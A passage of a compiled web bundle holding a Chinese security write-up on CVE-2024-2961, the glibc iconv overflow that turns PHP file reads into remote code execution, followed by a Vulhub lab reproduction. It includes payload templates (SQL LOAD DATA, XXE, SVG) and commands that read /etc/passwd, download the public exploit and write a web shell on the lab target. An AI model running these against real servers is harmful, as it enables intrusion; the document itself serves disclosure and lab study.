",(0,s.jsx)(n.code,{children:"getimagesize()"})," ",(0,s.jsx)(n.code,{children:"SplFileObject->read()"})," \u7b49\u3002\u6587\u4ef6\u5199\u5165\u4e5f\u4f1a\u53d7\u5230\u5f71\u54cd\uff08 ",(0,s.jsx)(n.code,{children:"file_put_contents()"})," \u53ca\u5176\u540c\u7ea7\uff09\u3002"]}),"\n",(0,s.jsx)(n.h3,{id:"\u4f7f\u7528\u6f0f\u6d1e",children:"\u4f7f\u7528\u6f0f\u6d1e"}),"\n",(0,s.jsx)(n.h4,{id:"sql-injection-to-rce-sql-\u6ce8\u5165\u5230-rce",children:"SQL injection to RCE SQL \u6ce8\u5165\u5230 RCE"}),"\n",(0,s.jsxs)(n.p,{children:["\u5982\u679c\u60a8\u5728 PDO/MySQL \u4e0a\u83b7\u5f97 SQL \u6ce8\u5165\uff0c\u60a8\u4e5f\u8bb8\u53ef\u4ee5\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"LOAD DATA LOCAL INFILE"})," \uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"LOAD DATA LOCAL INFILE 'php://filter/cnext...';\n"})}),"\n",(0,s.jsx)(n.h4,{id:"xxe",children:"XXE"}),"\n",(0,s.jsx)(n.p,{children:"XXE \u73b0\u5728\u662f RCE\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'<?xml version="1.0" ?>\n<!DOCTYPE root [\n    <!ENTITY exploit SYSTEM "php://filter/cnext...">\n]>\n<root>&exploit;</root>\n'})}),"\n",(0,s.jsx)(n.h3,{id:"\u4f5c\u4e3a-phar-\u7684\u66ff\u4ee3\u54c1",children:"\u4f5c\u4e3a PHAR \u7684\u66ff\u4ee3\u54c1"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e0e PHAR \u653b\u51fb\u76f8\u53cd\uff0c\u4ec5\u5bf9\u6587\u4ef6\uff08\u5982 ",(0,s.jsx)(n.code,{children:"file_exists()"})," \u6216 ",(0,s.jsx)(n.code,{children:"is_file()"})," \uff09\u6267\u884c\u68c0\u67e5\u7684\u51fd\u6570\u4e0d\u53d7\u5f71\u54cd\u3002\u4f46\u662f\uff0c\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u7528\u4f5c PHAR \u653b\u51fb\u7684\u66ff\u4ee3\u54c1\uff0c\u5982\u6f14\u793a\u4e2d\u6240\u793a\u3002\u7981\u7528 ",(0,s.jsx)(n.code,{children:"phar://"})," \u6216\u66f4\u65b0\u5230 PHP 8 \u4e0d\u4f1a\u62ef\u6551\u60a8\u3002"]}),"\n",(0,s.jsx)(n.h3,{id:"\u89e3\u6790\u5e93",children:"\u89e3\u6790\u5e93"}),"\n",(0,s.jsx)(n.p,{children:"\u6bcf\u4e2a\u4ee5\u67d0\u79cd\u65b9\u5f0f\u64cd\u7eb5 URL \u7684\u5e93\u90fd\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002\u4ee5\u4e0b\u662f\u6211\u5728\u5f00\u53d1\u6f0f\u6d1e\u65f6\u53d1\u73b0\u7684\u4e00\u4e9b\u65b0\u76ee\u6807\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"https://packagist.org/packages/meyfa/php-svg",children:"meyfa/php-svg"}),": \u6700\u6d41\u884c\u7684 SVG \u64cd\u4f5c\u5e93"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"https://packagist.org/packages/symfony/translation",children:"symfony/translation"}),": XLIFF \u89e3\u6790\u5668\u6613\u53d7\u653b\u51fb"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u4f8b\u5982\uff0cPHP-SVG \u5e93\u53ef\u80fd\u4f1a\u53d7\u5230\u8fd9\u6837\u7684\u6709\u6548\u8f7d\u8377\u7684\u653b\u51fb\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'<svg width="100" height="100">\n    <image href="php://filter/cnext/..." width="1" height="1" />\n</svg>\n'})}),"\n",(0,s.jsx)(n.p,{children:"HTML \u5230 PDF \u89e3\u6790\u5668\uff08\u5982 dompdf\u3001tcpdf \u7b49\uff09\u4e5f\u53ef\u80fd\u662f\u76ee\u6807\u3002"}),"\n",(0,s.jsx)(n.h3,{id:"\u7c7b\u5b9e\u4f8b\u5316",children:"\u7c7b\u5b9e\u4f8b\u5316"}),"\n",(0,s.jsx)(n.p,{children:"\u6709\u65f6\uff0c\u5728\u653b\u51fbPHP\u65f6\uff0c\u4f1a\u9047\u5230\u4ee5\u4e0b\u539f\u8bed\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"new $_GET['cls']($_GET['argument']);\n"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.a,{href:"https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/",children:"This excellent blogpost from PTswarm"})," describes many ways to get a file read from this primitive, which may all be used to trigger the exploit. Examples include ",(0,s.jsx)(n.code,{children:"SoapClient"}),", ",(0,s.jsx)(n.code,{children:"Imagick"}),", ",(0,s.jsx)(n.code,{children:"tidy"}),", or ",(0,s.jsx)(n.code,{children:"SimpleXMLElement"}),".\n\u8fd9\u7bc7\u6765\u81ea ",(0,s.jsx)(n.a,{href:"https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/",children:"PTswarm"})," \u7684\u4f18\u79c0\u535a\u6587\u63cf\u8ff0\u4e86\u4ece\u8fd9\u4e2a\u539f\u8bed\u4e2d\u8bfb\u53d6\u6587\u4ef6\u7684\u591a\u79cd\u65b9\u6cd5\uff0c\u8fd9\u4e9b\u65b9\u6cd5\u90fd\u53ef\u80fd\u7528\u4e8e\u89e6\u53d1\u6f0f\u6d1e\u5229\u7528\u3002\u793a\u4f8b\u5305\u62ec ",(0,s.jsx)(n.code,{children:"SoapClient"})," \u3001 ",(0,s.jsx)(n.code,{children:"Imagick"})," \u3001 ",(0,s.jsx)(n.code,{children:"tidy"})," \u6216 ",(0,s.jsx)(n.code,{children:"SimpleXMLElement"})," \u3002"]}),"\n",(0,s.jsx)(n.h3,{id:"\u4f5c\u4e3a\u5bf9\u5c0f\u5de5\u5177\u94fe\u7684\u6539\u8fdb",children:"\u4f5c\u4e3a\u5bf9\u5c0f\u5de5\u5177\u94fe\u7684\u6539\u8fdb"}),"\n",(0,s.jsxs)(n.p,{children:["\u5982\u679c\u60a8\u53d1\u73b0\u6587\u4ef6\u8bfb\u53d6 ",(0,s.jsx)(n.code,{children:"unserialize()"})," \u5c0f\u5de5\u5177\u94fe\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u8be5\u6f0f\u6d1e\u5c06\u5176\u5347\u7ea7\u5230 RCE\u3002\u968f\u7740\u6700\u8fd1\u7684\u5e94\u7528\u7a0b\u5e8f\u4ee5\u53ca PHP \u5e93\u8d8a\u6765\u8d8a\u591a\u5730\u4f7f\u7528\u7c7b\u578b\u8fd9\u4e00\u4e8b\u5b9e\uff0c\u5b83\u53ef\u80fd\u4f1a\u6d3e\u4e0a\u7528\u573a\u3002"]}),"\n",(0,s.jsx)(n.h3,{id:"\u5176\u4ed6\u4eba\u53ef\u80fd",children:"\u5176\u4ed6\u4eba\uff0c\u53ef\u80fd"}),"\n",(0,s.jsx)(n.p,{children:"\u53ea\u8981\u60a8\u63a7\u5236\u6587\u4ef6\u8bfb\u53d6\u6216\u6587\u4ef6\u5199\u5165\u63a5\u6536\u5668\u7684\u524d\u7f00\uff0c\u60a8\u5c31\u62e5\u6709\u4e86 RCE\uff01"}),"\n",(0,s.jsx)(n.h2,{id:"\u65f6\u95f4\u7ebf",children:"\u65f6\u95f4\u7ebf"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u53bb\u5e74 Crash \u53d1\u73b0"}),"\n",(0,s.jsx)(n.li,{children:"2\u6708 \u5f00\u59cb\u5904\u7406\u9519\u8bef"}),"\n",(0,s.jsx)(n.li,{children:"3 \u6708 26 \u65e5 Bug \u62a5\u544a\u7ed9 glibc \u5b89\u5168\u56e2\u961f"}),"\n",(0,s.jsx)(n.li,{children:"4 \u6708 4 \u65e5 Bug \u62a5\u544a\u7ed9 linux \u53d1\u884c\u7248"}),"\n",(0,s.jsx)(n.li,{children:"4 \u6708 17 \u65e5\u6f0f\u6d1e\u4f5c\u4e3a CVE-2024-2961 \u53d1\u5e03"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u6ce8\u610f\uff1aglibc \u5b89\u5168\u56e2\u961f\u901f\u5ea6\u5feb\u3001\u5f6c\u5f6c\u6709\u793c\u4e14\u6280\u672f\u80fd\u529b\u5f3a\u3002\u4ed6\u4eec\u5728\u4e00\u5468\u5185\u53d1\u5e03\u4e86\u4e00\u4e2a\u8865\u4e01\uff08\u4ee5\u53ca\u968f\u4e4b\u800c\u6765\u7684\u6240\u6709\u8865\u4e01\uff09\u3002\u975e\u5e38\u611f\u8c22\uff01*"}),"\n",(0,s.jsx)(n.h2,{id:"\u7ed3\u8bba",children:"\u7ed3\u8bba"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"CNEXT (CVE-2024-2961)"})," \u7cfb\u5217\u6587\u7ae0\u7684\u7b2c\u4e00\u90e8\u5206\u5230\u6b64\u7ed3\u675f \u3002\u8be5\u6f0f\u6d1e\u73b0\u5df2\u5728\u6211\u4eec\u7684 ",(0,s.jsx)(n.a,{href:"https://github.com/ambionics/cnext-exploits/",children:"GitHub"})," \u4e0a\u63d0\u4f9b\u3002\u8fd8\u6709\u5f88\u591a\u4e1c\u897f\u9700\u8981\u63a2\u7d22\uff1a\u76f4\u63a5\u8c03\u7528\u5462 ",(0,s.jsx)(n.code,{children:"iconv()"})," \uff1f\u5982\u679c\u8bfb\u53d6\u7684\u6587\u4ef6\u662f\u76f2\u6587\u4ef6\uff0c\u4f1a\u53d1\u751f\u4ec0\u4e48\u60c5\u51b5\uff1f"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u7b2c 2 \u90e8\u5206\u4e2d\uff0c\u6211\u4eec\u5c06\u66f4\u6df1\u5165\u5730\u7814\u7a76 PHP \u5f15\u64ce\uff0c\u4ee5\u5b9a\u4f4d\u5728\u975e\u5e38\u6d41\u884c\u7684 PHP \u7f51\u7edc\u90ae\u4ef6\u4e2d\u53d1\u73b0\u7684 ",(0,s.jsx)(n.code,{children:"iconv()"})," \u8c03\u7528\u3002\u6211\u5c06\u63cf\u8ff0\u8fd9\u79cd\u76f4\u63a5\u8c03\u7528\u5bf9 PHP \u751f\u6001\u7cfb\u7edf\u7684\u5f71\u54cd\uff0c\u5e76\u5411\u60a8\u5c55\u793a\u4e00\u4e9b\u610f\u60f3\u4e0d\u5230\u7684\u63a5\u6536\u5668\u3002\u6700\u540e\uff0c\u5728\u7b2c 3 \u90e8\u5206\u4e2d\uff0c\u6211\u4eec\u5c06\u4ecb\u7ecd\u76f2\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u5229\u7528\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u656c\u8bf7\u5173\u6ce8\uff01"}),"\n",(0,s.jsx)(n.h1,{id:"vulhub\u590d\u73b0",children:"VULHUB\u590d\u73b0"}),"\n",(0,s.jsxs)(n.p,{children:["GNU C \u662f\u4e00\u4e2a\u6807\u51c6\u7684ISO C\u4f9d\u8d56\u5e93\u3002\u5728GNU C\u4e2d\uff0c",(0,s.jsx)(n.code,{children:"iconv()"}),"\u51fd\u65702.39\u53ca\u4ee5\u524d\u5b58\u5728\u4e00\u5904\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8f\u5d29\u6e83\u6216\u8986\u76d6\u76f8\u90bb\u53d8\u91cf\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5982\u679c\u4e00\u4e2aPHP\u5e94\u7528\u4e2d\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528",(0,s.jsx)(n.code,{children:"iconv()"}),"\u7684\u8fd9\u4e2aCVE-2024-2961\u6f0f\u6d1e\uff0c\u5c06\u5176\u63d0\u5347\u4e3a\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u53c2\u8003\u94fe\u63a5\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://www.ambionics.io/blog/iconv-cve-2024-2961-p1",children:"https://www.ambionics.io/blog/iconv-cve-2024-2961-p1"})}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"\u6f0f\u6d1e\u73af\u5883",children:"\u6f0f\u6d1e\u73af\u5883"}),"\n",(0,s.jsx)(n.p,{children:"\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u542f\u52a8\u4e00\u4e2aPHP 8.3.4\u670d\u52a1\u5668\uff0c\u5176\u4f7f\u7528iconv 2.36\u4f5c\u4e3a\u4f9d\u8d56\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"docker compose up -d\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u670d\u52a1\u542f\u52a8\u540e\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7",(0,s.jsx)(n.code,{children:"http://your-ip:8080/index.php?file=/etc/passwd"}),"\u8fd9\u4e2a\u94fe\u63a5\u8bfb\u53d6",(0,s.jsx)(n.code,{children:"/etc/passwd"}),"\u6587\u4ef6\u3002"]}),"\n",(0,s.jsx)(n.h2,{id:"\u6f0f\u6d1e\u590d\u73b0",children:"\u6f0f\u6d1e\u590d\u73b0"}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u4f7f\u7528\u539f\u4f5c\u8005\u7ed9\u51fa\u7684",(0,s.jsx)(n.a,{href:"https://github.com/ambionics/cnext-exploits",children:"exploit"}),"\u524d\uff0c\u4f60\u9700\u8981\u51c6\u5907\u4e00\u4e2aLinux\u73af\u5883\u548cPython 3.10\u89e3\u91ca\u5668\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u5b89\u88c5\u4f9d\u8d56\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"pip install pwntools\npip install https://github.com/cfreal/ten/archive/refs/heads/main.zip\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7136\u540e\u4ece",(0,s.jsx)(n.a,{href:"https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py%E4%B8%8B%E8%BD%BDPOC%E5%B9%B6%E6%89%A7%E8%A1%8C%EF%BC%9A",children:"https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py\u4e0b\u8f7dPOC\u5e76\u6267\u884c\uff1a"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"wget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py\npython cnext-exploit.py http://your-ip:8080/index.php \"echo '<?=phpinfo();?>' > shell.php\"\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112571.png-.png",alt:"img"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53ef\u89c1\uff0c\u6211\u4eec\u5df2\u7ecf\u6210\u529f\u5199\u5165",(0,s.jsx)(n.code,{children:"shell.php"}),"\uff1a"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112572.png-.png",alt:"img"})}),"\n",(0,s.jsx)(n.h1,{id:"\u8f6c\u8f7d",children:"\u8f6c\u8f7d"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/README.zh-cn.md",children:"https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/README.zh-cn.md"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://www.ambionics.io/blog/iconv-cve-2024-2961-p1#cve-2024-2961-a-bug-in-the-glibc",children:"https://www.ambionics.io/blog/iconv-cve-2024-2961-p1#cve-2024-2961-a-bug-in-the-glibc"})}),"\n"]})]})}function x(e={}){const{wrapper:n}={...(0,d.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(t,{...e})}):t(e)}},8453:(e,n,c)=>{c.d(n,{R:()=>r,x:()=>l});var i=c(6540);const s={},d=i.createContext(s);function r(e){const n=i.useContext(d);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:r(e.components),i.createElement(d.Provider,{value:n},e.children)}}}]);